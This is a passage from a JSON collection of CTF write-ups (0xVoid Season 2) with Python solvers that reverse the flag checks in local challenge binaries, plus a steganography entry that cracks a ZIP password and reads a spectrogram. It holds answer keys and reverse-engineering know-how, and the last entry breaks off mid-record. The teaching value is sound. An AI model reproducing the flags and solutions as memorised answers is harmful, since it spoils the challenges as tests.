        "code": "#!/usr/bin/env python3\r\nfrom pathlib import Path\r\nfrom collections import Counter\r\n\r\nMASK = (1 << 64) - 1\r\nGOLDEN = 0x9E3779B97F4A7C15\r\nMIX_A = 0xBF58476D1CE4E5B9\r\nMIX_B = 0x94D049BB133111EB\r\nFNV_OFFSET = 0xCBF29CE484222325\r\nFNV_PRIME = 0x100000001B3\r\n\r\n\r\ndef u64(bs: bytes) -> int:\r\n    return int.from_bytes(bs, \"little\")\r\n\r\n\r\ndef u32(bs: bytes) -> int:\r\n    return int.from_bytes(bs, \"little\")\r\n\r\n\r\ndef rol8(x: int, n: int) -> int:\r\n    return ((x << n) | (x >> (8 - n))) & 0xFF\r\n\r\n\r\ndef ror8(x: int, n: int) -> int:\r\n    return ((x >> n) | (x << (8 - n))) & 0xFF\r\n\r\n\r\ndef rol64(x: int, n: int) -> int:\r\n    n &= 63\r\n    return ((x << n) | (x >> (64 - n))) & MASK\r\n\r\n\r\ndef splitmix_body(x: int) -> int:\r\n    \"\"\"Same SplitMix64 finalizer shape used twice by the binary.\"\"\"\r\n    x &= MASK\r\n    x ^= x >> 30\r\n    x = (x * MIX_A) & MASK\r\n    x ^= x >> 27\r\n    x = (x * MIX_B) & MASK\r\n    x ^= x >> 31\r\n    return x & MASK\r\n\r\n\r\ndef invmod_256(a: int) -> int:\r\n    # a is always odd because the binary ORs it with 1.\r\n    for x in range(1, 256, 2):\r\n        if (a * x) & 0xFF == 1:\r\n            return x\r\n    raise ValueError(f\"no inverse for {a:#x}\")\r\n\r\n\r\ndef load_mist(binary: Path) -> bytes:\r\n    data = binary.read_bytes()\r\n    # readelf shows .mist at file offset 0x2090, size 0xa20.\r\n    mist = data[0x2090:0x2090 + 0xA20]\r\n    if mist[:4] != b\"MRR2\":\r\n        raise RuntimeError(\"unexpected .mist header\")\r\n    return mist\r\n\r\n\r\ndef build_instruction_stream(mist: bytes):\r\n    seed = u64(mist[8:16])\r\n    fnv = FNV_OFFSET\r\n    ops = []\r\n\r\n    ebx = 0x29\r\n    while True:\r\n        # The folded tape visits all 320 qwords in .mist because gcd(0x49, 0x140) == 1.\r\n        idx = ebx % 0x140\r\n        tape_qword = u64(mist[0x10 + idx * 8:0x10 + idx * 8 + 8])\r\n\r\n        x = (0xD6E8FEB86659FD93 * idx) & MASK\r\n        x ^= seed\r\n        x ^= 0xA17E5EEDC0DEC0DE\r\n        x = (x + GOLDEN) & MASK\r\n        key = tape_qword ^ splitmix_body(x)\r\n        key_bytes = key.to_bytes(8, \"little\")\r\n\r\n        for b in key_bytes:\r\n            fnv ^= b\r\n            fnv = (fnv * FNV_PRIME) & MASK\r\n\r\n        selector = ((((0x1D * idx - 0x59) & 0xFFFFFFFF) ^ u32(key_bytes[:4])) & 0xFF) % 7\r\n        ops.append((idx, selector, key_bytes))\r\n\r\n        ebx += 0x49\r\n        if ebx == 0x5B69:\r\n            break\r\n\r\n    return seed, fnv, ops\r\n\r\n\r\ndef inverse_transform(final_state: bytes, ops) -> bytes:\r\n    st = bytearray(final_state)\r\n\r\n    for idx, selector, key in reversed(ops):\r\n        pos = key[1] & 0x0F\r\n        dl = key[4]\r\n        dh = key[5]\r\n        rot_src = key[3]\r\n        swap_src = key[2]\r\n        dword4 = u32(key[4:8])\r\n\r\n        if selector == 0:\r\n            # forward: st[pos] ^= dl\r\n            st[pos] ^= dl\r\n\r\n        elif selector == 1:\r\n            # forward: st[pos] += dl\r\n            st[pos] = (st[pos] - dl) & 0xFF\r\n\r\n        elif selector == 2:\r\n            # forward: rol8(st[pos], count)\r\n            count = rot_src & 7\r\n            if count == 0:\r\n                count = 1\r\n            st[pos] = ror8(st[pos], count)\r\n\r\n        elif selector == 3:\r\n            # swap is self-inverse\r\n            other = swap_src & 0x0F\r\n            st[pos], st[other] = st[other], st[pos]\r\n\r\n        elif selector == 4:\r\n            # forward: st[pos] = (odd_mul * st[pos] + dh) mod 256\r\n            mul = dl | 1\r\n            st[pos] = ((st[pos] - dh) * invmod_256(mul)) & 0xFF\r\n\r\n        elif selector == 5:\r\n            # Feistel-like half transform.\r\n            # forward: (L, R) -> (R, F(R) ^ L), so invert with R = newL.\r\n            new_l = u64(st[:8])\r\n            new_r = u64(st[8:16])\r\n            old_r = new_l\r\n\r\n            t = (dword4 ^ 0xA5C39E71) & 0xFFFFFFFF\r\n            t |= (dword4 << 32) & MASK\r\n            t = (t + idx * FNV_PRIME) & MASK\r\n            t = (t + old_r) & MASK\r\n            t = rol64(t, (rot_src % 63) + 1)\r\n\r\n            f = (((pos | 1) * 2) & MASK) ^ 0x9E3779B185EBCA87\r\n            f = (f * old_r) & MASK\r\n\r\n            old_l = (new_r ^ f ^ t) & MASK\r\n            st[:8] = old_l.to_bytes(8, \"little\")\r\n            st[8:16] = old_r.to_bytes(8, \"little\")\r\n\r\n        elif selector == 6:\r\n            # forward: new[i] = old[(shift + i) & 15]\r\n            shift = rot_src & 0x0F\r\n            if shift == 0:\r\n                shift = 1\r\n            new = st[:]\r\n            old = bytearray(16)\r\n            for i in range(16):\r\n                old[(shift + i) & 0x0F] = new[i]\r\n            st = old\r\n\r\n        else:\r\n            raise RuntimeError(\"bad selector\")\r\n\r\n    return bytes(st)\r\n\r\n\r\ndef forward_transform(initial_state: bytes, ops) -> bytes:\r\n    \"\"\"Forward emulator used only as a self-check for the recovered body.\"\"\"\r\n    st = bytearray(initial_state)\r\n    for idx, selector, key in ops:\r\n        pos = key[1] & 0x0F\r\n        dl = key[4]\r\n        dh = key[5]\r\n        rot_src = key[3]\r\n        swap_src = key[2]\r\n        dword4 = u32(key[4:8])\r\n\r\n        if selector == 0:\r\n            st[pos] ^= dl\r\n        elif selector == 1:\r\n            st[pos] = (st[pos] + dl) & 0xFF\r\n        elif selector == 2:\r\n            count = rot_src & 7\r\n            if count == 0:\r\n                count = 1\r\n            st[pos] = rol8(st[pos], count)\r\n        elif selector == 3:\r\n            other = swap_src & 0x0F\r\n            st[pos], st[other] = st[other], st[pos]\r\n        elif selector == 4:\r\n            st[pos] = ((dl | 1) * st[pos] + dh) & 0xFF\r\n        elif selector == 5:\r\n            l = u64(st[:8])\r\n            r = u64(st[8:16])\r\n            t = (dword4 ^ 0xA5C39E71) & 0xFFFFFFFF\r\n            t |= (dword4 << 32) & MASK\r\n            t = (t + idx * FNV_PRIME) & MASK\r\n            t = (t + r) & MASK\r\n            t = rol64(t, (rot_src % 63) + 1)\r\n            f = (((pos | 1) * 2) & MASK) ^ 0x9E3779B185EBCA87\r\n            f = (f * r) & MASK\r\n            st[:8] = r.to_bytes(8, \"little\")\r\n            st[8:16] = (f ^ l ^ t).to_bytes(8, \"little\")\r\n        elif selector == 6:\r\n            shift = rot_src & 0x0F\r\n            if shift == 0:\r\n                shift = 1\r\n            old = st[:]\r\n            for i in range(16):\r\n                st[i] = old[(shift + i) & 0x0F]\r\n    return bytes(st)\r\n\r\n\r\ndef derive_final_state(mist: bytes, seed: int, fnv: int) -> bytes:\r\n    target = mist[-16:]\r\n    final_key = fnv ^ seed\r\n    final_state = bytearray(16)\r\n\r\n    for i, target_byte in enumerate(target):\r\n        x = ((i * GOLDEN) & MASK) ^ final_key\r\n        x = (x + GOLDEN) & MASK\r\n        mask_byte = splitmix_body(x) & 0xFF\r\n        final_state[i] = target_byte ^ mask_byte\r\n\r\n    return bytes(final_state)\r\n\r\n\r\ndef main() -> None:\r\n    binary = Path(__file__).with_name(\"afterimage\")\r\n    mist = load_mist(binary)\r\n    seed, fnv, ops = build_instruction_stream(mist)\r\n    final_state = derive_final_state(mist, seed, fnv)\r\n    body = inverse_transform(final_state, ops)\r\n\r\n    if forward_transform(body, ops) != final_state:\r\n        raise RuntimeError(\"forward self-check failed\")\r\n    if not all(chr(c).isalnum() for c in body):\r\n        raise RuntimeError(f\"recovered body is not alphanumeric: {body!r}\")\r\n\r\n    print(f\"seed       : 0x{seed:016x}\")\r\n    print(f\"ops        : {len(ops)} {dict(sorted(Counter(op[1] for op in ops).items()))}\")\r\n    print(f\"fnv        : 0x{fnv:016x}\")\r\n    print(f\"final state: {final_state.hex()}\")\r\n    print(f\"body       : {body.decode()}\")\r\n    print(f\"flag       : 0xV01D{{{body.decode()}}}\")\r\n\r\n\r\nif __name__ == \"__main__\":\r\n    main()"
      }
    ],
    "terminalOutputs": [],
    "flag": "0xV01D{N3bula7R4v3n9X2Q}",
    "lessonsLearned": ""
  },
  {
    "id": "0xvoid-s2-rev-chronocore",
    "title": "ChronoCore",
    "category": "Reverse",
    "difficulty": "Medium",
    "points": 0,
    "date": "2026-08-16",
    "author": "Nattt",
    "ctfName": "0xVoid Season 2",
    "tags": [],
    "description": "Writeup for challenge ChronoCore",
    "problemDescription": "Binary `chronocore` menerima input flag dengan format:\n\n```\n0xV01D{...}\n```\n\nValidasi utamanya ada di fungsi sekitar `0x1390`. Program tidak menyimpan flag sebagai string utuh. Byte input diproses memakai state rolling, rotasi bit, konstanta hardcoded, dan urutan indeks yang dipermutasi. Dengan meniru state machine itu, flag bisa direcover dari belakang/constraint per byte.\n\nFlag:\n\n```\n0xV01D{vm_tr4c3s_l13_but_st4t3_t3lls}\n```",
    "tools": [],
    "analysis": "`strings` menunjukkan beberapa string yang berguna:\n\n```\nchronocore>\n0xV01D{\nrejected\naccepted\n```\n\nDari sini kelihatan program punya prompt, prefix flag, dan output sukses/gagal. Flag lengkap tidak muncul di `strings`, jadi perlu reverse fungsi validasinya.\n\nProgram bisa menerima input dari argv atau stdin:\n\n```bash\n./chronocore '0xV01D{test}'\n```\n\nOutputnya:\n\n```\nrejected\n```\n\nBagian awal `main` melakukan validasi format dasar:\n\n```asm\ncall strlen\ncmp  rax, 0x25\njne  rejected\n\nmemcmp(input, \"0xV01D{\", 7)\ncmp byte [rsp+0x24], 0x7d\n```\n\nArtinya panjang input harus `0x25` atau 37 byte.\n\nStruktur format:\n\n```\n0xV01D{ + isi 29 byte + }\n```\n\nSetelah format cocok, program memanggil fungsi validasi di sekitar alamat `0x1390`.\n\nDi `.rodata` ada beberapa array hardcoded:\n\n```\n0x2040 -> TARGET\n0x2080 -> ROT\n0x20c0 -> MASK\n0x2100 -> ADD\n0x2140 -> PERM\n```\n\nArray `PERM` berisi urutan posisi input yang dicek:\n\n```\n02 1a 14 1d 23 05 01 1c 04 0b 0f 0d 19 0c 21 18\n08 1b 16 24 11 03 1e 20 15 12 13 0e 00 07 0a 09\n10 1f 06 22 17\n```\n\nJadi byte input tidak dicek dari kiri ke kanan. Program mengambil byte dari posisi `PERM[i]`, lalu mengolahnya dengan state sebelumnya.\n\nOperasi penting per byte:\n\n```c\nc = input[PERM[i]];\nedi = ADD[i] + c + 17*i;\nedi ^= eax;\neax = rol32(edi, ROT[i]);\neax = eax * 0x45d9f3b;\neax = eax + i + 0x27100001;\n\nshift = (i & 3) * 8;\necx = (eax >> shift) + c;\ncl ^= MASK[i];\necx ^= r10;\n\nif ((ecx & 0xff) != TARGET[i]) reject;\nr10 = c + i + ecx;\n```\n\nState awal:\n\n```\neax = 0x9e3779b9\nr10 = 0x42\n```\n\nKarena setiap step hanya butuh satu byte baru sesuai `PERM[i]`, kita bisa brute force byte printable pada posisi tersebut, update state, lalu lanjut ke step berikutnya.",
    "solution": [
      {
        "title": "File Challenge",
        "content": "Isi archive:\n\n```\nREADME.md\nchronocore\n```\n\nHasil identifikasi:\n\n```bash\nfile chronocore\n```\n\nOutput penting:\n\n```\nchronocore: ELF 64-bit LSB pie executable, x86-64, dynamically linked, stripped\n```\n\nBinary stripped, jadi nama fungsi asli tidak tersedia."
      },
      {
        "title": "Penyusunan Solve Script",
        "content": "`solve.py` menyalin konstanta dari `.rodata`, lalu mengemulasi state machine. Prefix `0xV01D{` dan suffix `}` dipasang sebagai byte yang sudah diketahui.\n\nSearch dilakukan sesuai urutan `PERM`, bukan urutan normal string. Untuk setiap posisi, solver mencoba karakter printable sampai state menghasilkan byte `TARGET[i]`.\n\nAda collision printable kecil karena validasi hanya membandingkan low byte (`cl`). Binary lokal menerima lebih dari satu kandidat. Kandidat yang readable dan sesuai pesan challenge adalah:\n\n```\n0xV01D{vm_tr4c3s_l13_but_st4t3_t3lls}\n```"
      },
      {
        "title": "Cara Menjalankan",
        "content": "```bash\nchmod +x solve.py\npython3 solve.py\n```\n\nOutput:\n\n```\n0xV01D{vm_tr4c3s_l13_but_st4t3_t3lls}\naccepted\n```\n\nValidasi manual:\n\n```bash\n./chronocore '0xV01D{vm_tr4c3s_l13_but_st4t3_t3lls}'\n```\n\nOutput:\n\n```\naccepted\n```"
      },
      {
        "title": "Solver Script",
        "content": "The complete exploit/solver script (solve.py) is provided below:",
        "code": "#!/usr/bin/env python3\r\nfrom pathlib import Path\r\nimport subprocess\r\n\r\n# Constants copied from .rodata and the state machine at check() / 0x1390.\r\nTARGET = bytes.fromhex(\r\n    \"febc76f300fb627b8ba26a809581d33329578c65\"\r\n    \"d453112a4bbb7312af4a4275a24bd83fc4\"\r\n)\r\nROT = bytes.fromhex(\r\n    \"030601030702060704040707070301020304020202050405\"\r\n    \"03050103050106010304030504\"\r\n)\r\nMASK = bytes.fromhex(\r\n    \"17ca5e5ad650c42936b19508993dd092fa3051b9f1e80dad\"\r\n    \"d20b1d6e9732968843a148cdee\"\r\n)\r\nADD = bytes.fromhex(\r\n    \"98df2c56cdf04be88e48f14504a2b9de8ccc72015c26f1a4\"\r\n    \"d7c5c0060c7e9987cc496bff58\"\r\n)\r\nPERM = bytes.fromhex(\r\n    \"021a141d2305011c040b0f0d190c2118081b162411031e20\"\r\n    \"1512130e00070a09101f062217\"\r\n)\r\n\r\nFLAG_LEN = 37\r\nPREFIX = b\"0xV01D{\"\r\nSUFFIX = b\"}\"\r\n\r\n# Printable charset. The validator has a few byte-level collisions, but this\r\n# range keeps the search grounded to a normal CTF flag.\r\nALLOWED = (\r\n    b\"abcdefghijklmnopqrstuvwxyz\"\r\n    b\"ABCDEFGHIJKLMNOPQRSTUVWXYZ\"\r\n    b\"0123456789\"\r\n    b\"_{}-!@#$%^&*()+[]=;:,./?\"\r\n)\r\n\r\n\r\ndef rol32(x: int, n: int) -> int:\r\n    x &= 0xFFFFFFFF\r\n    n &= 31\r\n    return ((x << n) | (x >> (32 - n))) & 0xFFFFFFFF\r\n\r\n\r\ndef vm_step(i: int, c: int, eax: int, r10: int):\r\n    \"\"\"Emulate one comparison step from the validator.\r\n\r\n    Return next (eax, r10) if byte c satisfies TARGET[i], otherwise None.\r\n    \"\"\"\r\n    edi = (ADD[i] + c + (17 * i)) & 0xFFFFFFFF\r\n    edi ^= eax\r\n\r\n    eax = rol32(edi, ROT[i])\r\n    eax = (eax * 0x45D9F3B) & 0xFFFFFFFF\r\n    eax = (eax + i + 0x27100001) & 0xFFFFFFFF\r\n\r\n    shift = (i & 3) * 8\r\n    ecx = ((eax >> shift) + c) & 0xFFFFFFFF\r\n\r\n    # The binary does: xor cl, MASK[i]\r\n    ecx = (ecx & 0xFFFFFF00) | (((ecx & 0xFF) ^ MASK[i]) & 0xFF)\r\n\r\n    # Then it xors the current rolling state and checks only cl.\r\n    ecx ^= r10\r\n    ecx &= 0xFFFFFFFF\r\n    if (ecx & 0xFF) != TARGET[i]:\r\n        return None\r\n\r\n    # Accepted byte updates the rolling state.\r\n    next_r10 = (c + i + ecx) & 0xFFFFFFFF\r\n    return eax, next_r10\r\n\r\n\r\ndef solve_all():\r\n    known = {i: b for i, b in enumerate(PREFIX)}\r\n    known[FLAG_LEN - 1] = SUFFIX[0]\r\n\r\n    start = [None] * FLAG_LEN\r\n    for pos, val in known.items():\r\n        start[pos] = val\r\n\r\n    out = []\r\n\r\n    def dfs(i: int, eax: int, r10: int, flag):\r\n        if i == FLAG_LEN:\r\n            out.append(bytes(flag))\r\n            return\r\n\r\n        pos = PERM[i]\r\n        if flag[pos] is not None:\r\n            candidates = [flag[pos]]\r\n        else:\r\n            candidates = ALLOWED\r\n\r\n        for c in candidates:\r\n            nxt = vm_step(i, c, eax, r10)\r\n            if nxt is None:\r\n                continue\r\n            new_flag = flag[:]\r\n            new_flag[pos] = c\r\n            dfs(i + 1, nxt[0], nxt[1], new_flag)\r\n\r\n    dfs(0, 0x9E3779B9, 0x42, start)\r\n    return out\r\n\r\n\r\ndef score_candidate(flag: bytes) -> int:\r\n    \"\"\"Prefer the human-readable sentence-like flag if collisions appear.\"\"\"\r\n    inside = flag[len(PREFIX):-1]\r\n    words = inside.split(b\"_\")\r\n    score = 0\r\n    for word in words:\r\n        if word:\r\n            score += 3\r\n        if all(chr(c).isalnum() for c in word):\r\n            score += 5\r\n    score -= sum(c not in b\"abcdefghijklmnopqrstuvwxyz0123456789_{}\" for c in flag) * 20\r\n    score += inside.count(b\"_\") * 2\r\n    return score\r\n\r\n\r\ndef main():\r\n    candidates = solve_all()\r\n    if not candidates:\r\n        raise SystemExit(\"no candidate found\")\r\n\r\n    candidates.sort(key=score_candidate, reverse=True)\r\n    flag = candidates[0]\r\n    print(flag.decode())\r\n\r\n    # Optional proof: run the local binary when present.\r\n    binary = Path(__file__).with_name(\"chronocore\")\r\n    if binary.exists():\r\n        p = subprocess.run([str(binary), flag.decode()], capture_output=True, text=True)\r\n        print(p.stdout.strip())\r\n\r\n\r\nif __name__ == \"__main__\":\r\n    main()"
      }
    ],
    "terminalOutputs": [],
    "flag": "0xV01D{vm_tr4c3s_l13_but_st4t3_t3lls}",
    "lessonsLearned": ""
  },
  {
    "id": "0xvoid-s2-rev-turningcurse",
    "title": "TURING'S CURSE",
    "category": "Reverse",
    "difficulty": "Medium",
    "points": 0,
    "date": "2026-08-16",
    "author": "Nattt",
    "ctfName": "0xVoid Season 2",
    "tags": [],
    "description": "Writeup for challenge TURING'S CURSE",
    "problemDescription": "",
    "tools": [],
    "analysis": "",
    "solution": [
      {
        "title": "Challenge Info",
        "content": "**Title:** TURING'S CURSE\n**Category:** Reverse Engineering\n**Flag format:**\n\n```\n0xV01D{...}\n```\n\nChallenge description hints that the binary contains many fake names/flags and that the real solution cannot be obtained by simply running strings or brute forcing. The intended path is to understand the transformation applied to the input and reverse it properly."
      },
      {
        "title": "Initial Recon",
        "content": "First, check the binary type:\n\n```bash\nfile void\n```\n\nResult:\n\n```\nELF 64-bit LSB pie executable, x86-64, dynamically linked, stripped\n```\n\nThe binary is stripped and PIE-enabled, so symbol names are not available and addresses are randomized at runtime.\n\nBasic hardening check:\n\n```bash\nchecksec --file=void\n```\n\nThe important point is that this is a native ELF binary and should be treated as a reverse engineering challenge, not a simple string search challenge."
      },
      {
        "title": "Decoy Flags",
        "content": "Running strings shows many flag-like values:\n\n```bash\nstrings void | grep -i V01D\n```\n\nExample decoys include:\n\n```\n0xV01D{1mp0ss1bl3_p4th_r34ch3d_gh0st}\n0xV01D{th1s_1s_n0t_th3_r34l_0n3_s0rry}\n0xV01D{d3c0y_fl4g_th3_v01d_l4ughs_x0}\n```\n\nThese are fake. The challenge description already warns that the obvious answer is not the real one.\n\nThere is also a XOR-decoded decoy:\n\n```\n0xV01D{K1ll_7h3_CUR53_57R1NG}\n```\n\nSubmitting or testing these values does not unseal the binary."
      },
      {
        "title": "Program Behavior",
        "content": "When executed, the program asks for a name/input. The expected format is:\n\n```\n0xV01D{<payload>}\n```\n\nThe actual validated payload length is 32 bytes, so the full flag length is:\n\n```\nlen(\"0xV01D{\") + 32 + len(\"}\") = 40\n```\n\nThe real validation logic extracts the 32-byte payload inside the braces and applies a custom transformation before comparing the result against a fixed target state."
      },
      {
        "title": "Anti-Debugging",
        "content": "The binary contains an anti-debugging check using `ptrace`.\n\nThis is not the main challenge logic, but it can interfere with debugging under tools such as `gdb`. The check can be bypassed or avoided by static analysis.\n\nThe core solution does not require patching the binary permanently; we only need to understand the transformation and invert it."
      },
      {
        "title": "Real Validation Logic",
        "content": "After reversing the binary, the actual validation flow is a small VM-like sequence. The decoded opcodes are:\n\n```\na1 b2 c3 d4 00\na1 b2 c3 d4 01\na1 b2 c3 d4 02\ne5 f6\n```\n\nThe opcode meanings are:\n\n| Opcode | Meaning |\n|---|---|\n| A1 | SubBytes |\n| B2 | Permutation |\n| C3 | MixColumns over GF(256) |\n| D4 | AddRoundKey / XOR round key |\n| E5 | Compare final state |\n| F6 | Finish |\n\nSo the payload is transformed through 3 rounds:\n\n```\nRound 0: SubBytes -> Permutation -> MixColumns -> AddRoundKey\nRound 1: SubBytes -> Permutation -> MixColumns -> AddRoundKey\nRound 2: SubBytes -> Permutation -> MixColumns -> AddRoundKey\n```\n\nAfter the third round, the result is compared with a 32-byte target state."
      },
      {
        "title": "Target State",
        "content": "The target state found in the binary is:\n\n```\nf2445b07a777f4aba36bd35b832beb2b5d825ff488552d758990e2b11bb5cae7\n```\n\nBecause the transformation is reversible, the correct approach is not to brute force the input. Instead, start from the target state and apply the inverse operations in reverse round order."
      },
      {
        "title": "Reversing the Transformation",
        "content": "Forward order per round:\n\n```\nSubBytes -> Permutation -> MixColumns -> AddRoundKey\n```\n\nTherefore, inverse order per round is:\n\n```\nAddRoundKey^-1 -> MixColumns^-1 -> Permutation^-1 -> SubBytes^-1\n```\n\nSince XOR is its own inverse, reversing AddRoundKey is simply applying the same XOR key again.\n\nThe inverse process is applied from round 2 down to round 0:\n\n```python\nfor round in [2, 1, 0]:\n    undo AddRoundKey\n    undo MixColumns\n    undo Permutation\n    undo SubBytes\n```\n\nThis recovers the original 32-byte payload."
      },
      {
        "title": "Solver",
        "content": "The solver implements the inverse of each operation and starts from the final target state.\n\nSimplified structure:\n\n```python\nstate = bytes.fromhex(\n    \"f2445b07a777f4aba36bd35b832beb2b5d825ff488552d758990e2b11bb5cae7\"\n)\n\nfor r in reversed(range(3)):\n    state = inv_add_round_key(state, r)\n    state = inv_mix_columns(state)\n    state = inv_permutation(state)\n    state = inv_sub_bytes(state)\n\npayload = state.decode()\nflag = f\"0xV01D{{{payload}}}\"\nprint(flag)\n```\n\nRecovered payload:\n\n```\nth3_v01d_g4z3s_b4ck_1nt0_y0u_rev\n```\n\nRecovered full flag:\n\n```\n0xV01D{th3_v01d_g4z3s_b4ck_1nt0_y0u_rev}\n```"
      },
      {
        "title": "Verification",
        "content": "Test the recovered flag against the binary:\n\n```bash\nprintf '%s\\n' '0xV01D{th3_v01d_g4z3s_b4ck_1nt0_y0u_rev}' | ./void\n```\n\nSuccessful output:\n\n```\n:: V01D CORE UNSEALED ::\nالاسم الحقيقي: 0xV01D{th3_v01d_g4z3s_b4ck_1nt0_y0u_rev}\n```\n\nThis confirms that the recovered value is the real flag, not one of the embedded decoys."
      },
      {
        "title": "Solver Script",
        "content": "The complete exploit/solver script (solve.py) is provided below:",
        "code": "#!/usr/bin/env python3\r\nfrom pathlib import Path\r\n\r\nBIN_PATH = Path(__file__).with_name('void')\r\nif not BIN_PATH.exists():\r\n    # fallback for this sandbox/upload name\r\n    BIN_PATH = Path('/mnt/data/void(1)')\r\n\r\nblob = BIN_PATH.read_bytes()\r\nMASK64 = (1 << 64) - 1\r\n\r\ndef xs64(x: int) -> int:\r\n    x ^= (x << 13) & MASK64\r\n    x ^= x >> 7\r\n    x ^= (x << 17) & MASK64\r\n    return x & MASK64\r\n\r\ndef shuffle(n: int, seed: int) -> bytes:\r\n    a = list(range(n))\r\n    s = seed & MASK64\r\n    for i in range(n, 1, -1):\r\n        s = xs64(s)\r\n        j = s % i\r\n        a[i - 1], a[j] = a[j], a[i - 1]\r\n    return bytes(a)\r\n\r\ndef gf_tables():\r\n    exp = [0] * 512\r\n    log = [0] * 256\r\n    x = 1\r\n    for i in range(255):\r\n        exp[i] = x\r\n        log[x] = i\r\n        y = x << 1\r\n        if x & 0x80:\r\n            y ^= 0x1D\r\n        x = y & 0xFF\r\n    for i in range(512 - 255):\r\n        exp[255 + i] = exp[i]\r\n    return exp, log\r\n\r\nEXP, LOG = gf_tables()\r\n\r\ndef gmul(a: int, b: int) -> int:\r\n    if a == 0 or b == 0:\r\n        return 0\r\n    return EXP[LOG[a] + LOG[b]]\r\n\r\ndef ginv(a: int) -> int:\r\n    return EXP[255 - LOG[a]]\r\n\r\nsbox = shuffle(256, 0x9E3779B97F4A7C15)\r\ninv_sbox = [0] * 256\r\nfor i, b in enumerate(sbox):\r\n    inv_sbox[b] = i\r\n\r\npbox = shuffle(32, 0xD1B54A32D192ED03)\r\n# matrix: inv(row ^ col) for row=0..3, col=4..7\r\nmat = bytes(ginv(r ^ c) for r in range(4) for c in range(4, 8))\r\n\r\ndef invert_matrix(m: bytes) -> bytes:\r\n    a = [[m[4*r+c] for c in range(4)] + [1 if r == c else 0 for c in range(4)] for r in range(4)]\r\n    for col in range(4):\r\n        pivot = next(r for r in range(col, 4) if a[r][col])\r\n        a[col], a[pivot] = a[pivot], a[col]\r\n        invp = ginv(a[col][col])\r\n        for c in range(8):\r\n            a[col][c] = gmul(a[col][c], invp)\r\n        for r in range(4):\r\n            if r == col:\r\n                continue\r\n            f = a[r][col]\r\n            if f:\r\n                for c in range(8):\r\n                    a[r][c] ^= gmul(f, a[col][c])\r\n    return bytes(a[r][4+c] for r in range(4) for c in range(4))\r\n\r\ninv_mat = invert_matrix(mat)\r\n\r\n# Round keys are generated by xorshift64 bytes at runtime, 3 * 32 bytes.\r\ns = 0xA24BAED4963EE407\r\nkeys = []\r\nfor _ in range(96):\r\n    s = xs64(s)\r\n    keys.append(s & 0xFF)\r\nkeys = bytes(keys)\r\n\r\ndef xor_key(state: bytes, rnd: int) -> bytes:\r\n    k = keys[32*rnd:32*(rnd+1)]\r\n    return bytes(x ^ y for x, y in zip(state, k))\r\n\r\ndef inv_mix(state: bytes) -> bytes:\r\n    out = bytearray(32)\r\n    for off in range(0, 32, 4):\r\n        block = state[off:off+4]\r\n        for r in range(4):\r\n            out[off+r] = 0\r\n            for c in range(4):\r\n                out[off+r] ^= gmul(inv_mat[4*r+c], block[c])\r\n    return bytes(out)\r\n\r\ndef inv_perm(state: bytes) -> bytes:\r\n    old = bytearray(32)\r\n    for i, p in enumerate(pbox):\r\n        old[p] = state[i]\r\n    return bytes(old)\r\n\r\ndef inv_sub(state: bytes) -> bytes:\r\n    return bytes(inv_sbox[b] for b in state)\r\n\r\n# Final target bytes from .rodata at VA/file offset 0x2f80.\r\nstate = blob[0x2F80:0x2FA0]\r\nfor rnd in (2, 1, 0):\r\n    state = xor_key(state, rnd)\r\n    state = inv_mix(state)\r\n    state = inv_perm(state)\r\n    state = inv_sub(state)\r\n\r\nflag = b'0xV01D{' + state + b'}'\r\nprint(flag.decode())"
      }
    ],
    "terminalOutputs": [],
    "flag": "0xV01D{th3_v01d_g4z3s_b4ck_1nt0_y0u_rev}",
    "lessonsLearned": ""
  },
  {
    "id": "0xvoid-s2-stegano-transmission",
    "title": "Transmission",
    "category": "Steganography",
    "difficulty": "Medium",
    "points": 0,
    "date": "2026-08-16",
    "author": "Nattt",
    "ctfName": "0xVoid Season 2",
    "tags": [],
    "description": "Writeup for challenge Transmission",
    "problemDescription": "Archive berisi satu file `unknown.unknown`, tetapi entry ZIP terenkripsi. Password tidak ada sebagai string plain di dalam archive, sehingga layer pertama diselesaikan dengan cracking lokal terhadap ZipCrypto.\n\nPassword yang valid adalah:\n\n```text\nwhatever1\n```\n\nSetelah diekstrak, `unknown.unknown` ternyata merupakan file WAV PCM 16-bit mono 44100 Hz berdurasi 6 detik. Pesan tidak tersimpan sebagai teks pada metadata atau raw string, tetapi digambar pada domain frekuensi. Saat audio dibuka sebagai spectrogram/waterfall, flag terlihat jelas.",
    "tools": [],
    "analysis": "`unzip -l` hanya menampilkan satu entry:\n\n```text\nunknown.unknown\n```\n\nSaat diekstrak biasa, `unzip` meminta password. Dari `zipinfo -v`, flag bit menunjukkan bahwa entry menggunakan enkripsi ZIP klasik/ZipCrypto, bukan AES.",
    "solution": [
      {
        "title": "File Challenge",
        "content": "```bash\n$ file Transmission.zip\nTransmission.zip: Zip archive data, made by v3.0 UNIX, extract using at least v2.0\n\n$ zipinfo -v Transmission.zip\nunknown.unknown\ncompression method: deflated\nfile security status: encrypted\nCRC: dfd0c27e\nuncompressed size: 529244\n```"
      },
      {
        "title": "Layer ZIP",
        "content": "Cracking dilakukan secara lokal menggunakan kandidat wordlist dan mutasi sederhana. Password yang cocok adalah:\n\n```text\nwhatever1\n```\n\nEkstraksi dilakukan dengan:\n\n```bash\nunzip -P whatever1 Transmission.zip\n```\n\nHasilnya:\n\n```bash\n$ file unknown.unknown\nunknown.unknown: RIFF (little-endian) data, WAVE audio, Microsoft PCM, 16 bit, mono 44100 Hz\n```"
      },
      {
        "title": "Layer Audio",
        "content": "File WAV memiliki durasi sekitar 6 detik. Pemeriksaan menggunakan `strings` pada raw audio tidak menghasilkan flag, sehingga payload bukan berupa teks langsung.\n\nKarena challenge menggunakan konsep *transmission* dan *signal*, file kemudian dianalisis menggunakan waterfall/spectrogram.\n\nCommand yang digunakan:\n\n```bash\nsox unknown.unknown -n spectrogram -o spectrogram.png -x 3000 -y 1000 -z 60 -r -m -l -t Transmission\n```\n\nPada `spectrogram.png`, teks flag terlihat jelas di bagian tengah:\n\n```text\n0xV01D{h1dd3n_1n_th3_sp3ctr0}\n```"
      },
      {
        "title": "Penyusunan Solve Script",
        "content": "`solve.py` melakukan dua tahap:\n\n1. Mengekstrak `unknown.unknown` dari `Transmission.zip` menggunakan password `whatever1`.\n2. Membuat `spectrogram.png` menggunakan SoX agar flag dapat diverifikasi secara visual.\n\nScript juga mencetak flag yang terbaca dari spectrogram."
      },
      {
        "title": "Cara Menjalankan",
